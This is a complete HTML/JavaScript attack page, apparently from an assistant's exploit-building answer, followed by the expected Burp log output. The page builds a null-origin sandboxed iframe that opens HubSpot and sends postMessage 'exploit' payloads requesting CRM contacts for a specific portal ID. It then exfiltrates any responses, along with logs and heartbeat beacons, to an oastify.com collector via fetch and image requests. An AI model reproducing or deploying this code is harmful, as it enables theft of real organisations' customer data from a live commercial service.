<!DOCTYPE html>
<html>
<head><title>Collector</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
<h2>Collector Active</h2>
<div id="log" style="max-height:80vh;overflow:auto;border:1px solid #0f0;padding:10px;"></div>

<script>
const EXFIL = '8enpds891mi66ld8hc42ougriio9c50u.oastify.com';
let msgCount = 0;

function log(msg) {
    msgCount++;
    const time = new Date().toLocaleTimeString();
    document.getElementById('log').innerHTML = `[${time}] #${msgCount}: ${msg}<br>` + document.getElementById('log').innerHTML;
    
    // Exfiltrate from collector (NOT from null frame)
    new Image().src = `https://${EXFIL}/?c=${encodeURIComponent(msg)}`;
}

log('âœ“ Collector loaded');

window.addEventListener('message', function(e) {
    log(`ðŸ“¨ Message from: ${e.origin}`);
    
    // Handle instruction from XSS
    if (e.data.action === 'CREATE_NULL_ATTACK') {
        log('ðŸš€ Creating null origin attack');
        
        const nullFrame = document.createElement('iframe');
        nullFrame.sandbox = 'allow-scripts allow-popups'; // NULL ORIGIN!
        nullFrame.style.cssText = 'width:100%;height:400px;border:3px solid yellow;margin-top:20px';
        
        nullFrame.srcdoc = `
<!DOCTYPE html>
<html>
<body style="background:#333;color:#ff0;padding:10px;font-family:monospace;">
<h3>Null Origin Frame</h3>
<div id="s"></div>
<script>
function l(m) {
    document.getElementById('s').innerHTML += '<br>' + m;
    // Send ALL logs to parent via postMessage
    window.parent.postMessage({type: 'LOG', msg: m}, '*');
}

l('NULL_FRAME: Origin = ' + window.origin);
l('NULL_FRAME: Opening HubSpot...');

try {
    const hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
    
    if (!hub) {
        l('NULL_FRAME: ERROR - popup blocked');
        window.parent.postMessage({type: 'ERROR', msg: 'Popup blocked'}, '*');
    } else {
        l('NULL_FRAME: HubSpot window opened');
        window.parent.postMessage({type: 'SUCCESS', msg: 'HubSpot opened'}, '*');
        
        // Poll until loaded
        let attempts = 0;
        const checker = setInterval(() => {
            attempts++;
            
            try {
                hub.origin; // Throws when cross-origin
                if (attempts % 20 === 0) {
                    l('NULL_FRAME: Still loading... attempt ' + attempts);
                }
            } catch(err) {
                clearInterval(checker);
                l('NULL_FRAME: HubSpot loaded! Attempts: ' + attempts);
                l('NULL_FRAME: Error msg: ' + err.message);
                
                window.parent.postMessage({
                    type: 'HUBSPOT_LOADED',
                    attempts: attempts
                }, '*');
                
                // Listen for HubSpot responses
                window.addEventListener('message', resp => {
                    if (resp.source === hub) {
                        l('NULL_FRAME: Got response from HubSpot!');
                        
                        // Send to parent collector
                        window.parent.postMessage({
                            type: 'HUBSPOT_RESPONSE',
                            data: resp.data
                        }, '*');
                    }
                });
                
                // Send exploits
                setTimeout(() => {
                    l('NULL_FRAME: Sending exploit 1');
                    
                    hub.postMessage({
                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                        commandId: 'getContacts',
                        featureId: 'crm',
                        parameters: {portalId: '46962361'},
                        resultCount: 100,
                        language: 'en',
                        objectId: '46962361',
                        applicationId: 'crm',
                        basePath: '/crm/v3/objects/contacts'
                    }, '*');
                    
                    window.parent.postMessage({type: 'LOG', msg: 'Exploit 1 sent'}, '*');
                }, 1000);
                
                setTimeout(() => {
                    l('NULL_FRAME: Sending exploit 2');
                    
                    hub.postMessage({
                        type: 'raw',
                        body: {action: 'getData', portalId: '46962361'}
                    }, '*');
                    
                    window.parent.postMessage({type: 'LOG', msg: 'Exploit 2 sent'}, '*');
                }, 2000);
            }
            
            if (attempts > 150) {
                clearInterval(checker);
                l('NULL_FRAME: TIMEOUT after ' + attempts + ' attempts');
                window.parent.postMessage({type: 'ERROR', msg: 'Timeout'}, '*');
            }
        }, 100);
    }
} catch(err) {
    l('NULL_FRAME: EXCEPTION - ' + err.message);
    window.parent.postMessage({type: 'ERROR', msg: err.message}, '*');
}
</script>
</body>
</html>
        `;
        
        document.body.appendChild(nullFrame);
        log('âœ“ Null iframe added to DOM');
    }
    
    // Handle messages FROM the null frame
    if (e.data.type === 'LOG') {
        log('ðŸ”¸ ' + e.data.msg);
    }
    
    if (e.data.type === 'ERROR') {
        log('âŒ ERROR: ' + e.data.msg);
    }
    
    if (e.data.type === 'SUCCESS') {
        log('âœ… SUCCESS: ' + e.data.msg);
    }
    
    if (e.data.type === 'HUBSPOT_LOADED') {
        log('ðŸŽ¯ HubSpot loaded after ' + e.data.attempts + ' attempts');
    }
    
    if (e.data.type === 'HUBSPOT_RESPONSE') {
        log('ðŸ’Ž HUBSPOT RESPONSE RECEIVED!');
        
        const data = JSON.stringify(e.data.data);
        log('Data preview: ' + data.substring(0, 100));
        
        // Exfiltrate
        fetch(`https://${EXFIL}/hubspot_response`, {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
        
        new Image().src = `https://${EXFIL}/?resp=${encodeURIComponent(data.substring(0, 400))}`;
        
        // Forward to opener
        if (window.opener) {
            window.opener.postMessage({
                type: 'HUBSPOT_DATA',
                data: e.data.data
            }, '*');
        }
    }
});

// Notify opener
if (window.opener) {
    log('âœ“ Has opener - sending ready signal');
    window.opener.postMessage({status: 'collector_ready'}, '*');
} else {
    log('âš ï¸ No opener detected');
}

// Heartbeat
setInterval(() => {
    new Image().src = `https://${EXFIL}/?heartbeat=${msgCount}`;
}, 10000);
</script>
</body>
</html>
```

---

## **What You Should See Now:**

**In Burp:**
```
/?c=âœ“%20Collector%20loaded
/?c=âœ“%20Has%20opener
/?c=ðŸ“¨%20Message%20from:%20https://...hubspotpreview
/?c=ðŸš€%20Creating%20null%20origin%20attack
/?c=âœ“%20Null%20iframe%20added%20to%20DOM
/?c=ðŸ”¸%20NULL_FRAME:%20Origin%20=%20null
/?c=ðŸ”¸%20NULL_FRAME:%20Opening%20HubSpot...
/?c=âœ…%20SUCCESS:%20HubSpot%20opened
/?c=ðŸ”¸%20NULL_FRAME:%20Still%20loading...
/?c=ðŸŽ¯%20HubSpot%20loaded%20after%20X%20attempts
/?c=ðŸ”¸%20Exploit%201%20sent
/?c=ðŸ’Ž%20HUBSPOT%20RESPONSE%20RECEIVED!
POST /hubspot_response
